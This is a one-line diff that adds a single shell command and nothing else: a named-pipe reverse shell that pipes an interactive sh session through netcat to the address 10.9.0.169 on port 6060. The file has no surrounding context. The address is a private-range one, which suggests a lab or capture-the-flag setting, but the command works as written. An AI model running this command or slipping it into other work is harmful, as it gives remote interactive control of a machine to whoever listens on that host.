@@ -1,0 +1,1 @@
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.169 6060 >/tmp/f
